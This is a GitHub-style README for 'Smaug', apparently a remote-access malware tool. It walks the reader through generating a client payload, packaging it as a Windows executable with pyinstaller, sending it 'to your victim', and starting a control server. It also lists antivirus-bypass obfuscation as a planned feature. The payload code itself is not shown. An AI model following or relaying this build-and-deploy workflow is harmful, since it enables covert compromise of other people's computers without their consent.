<div style="display: flex; justify-content: center; align-items: center;">
    <img src="./images/icon.png" height=50 style="margin-right: 15px">
    <h2 style="text-decoration: underline; color: #c24164">Smaug</h2>
</div>

<img src="/images/demo.png" style="border-radius: 12px; box-shadow: 0px 0px 15px #c24164;"/>

## Installation

You need python installed to use this application

Clone the repository and cd in to it
```
git clone https://github.com/gokiimax/Smaug.git
cd Smaug
```

1. Install Requirements
```
./install.bat
```

2. Configure [config.json](./config.json) and Create the payload
```
./start.bat

╭── [ Smaug@admin ]
╰──────# createpayload
```

3. Create exe from client.pyw
```
python3 -m pip install auto-py-to-exe
pyinstaller --noconfirm --onefile --console "./out/client.pyw"
```

4. Send Your new Exe file to your victim and Start the server
```
./start

╭── [ Smaug@admin ]
╰──────# start server
```

## TODO

- [x] - Config
- [x] - Create Payload
- [ ] - Obfuscation for bypass
- [x] - Update Checker
- [x] - Themes

## Themes

- red
- blue
- green
- purple
- black
- white
- Cyan

# Credits
[![Twitter Link](https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/gokimax_x)
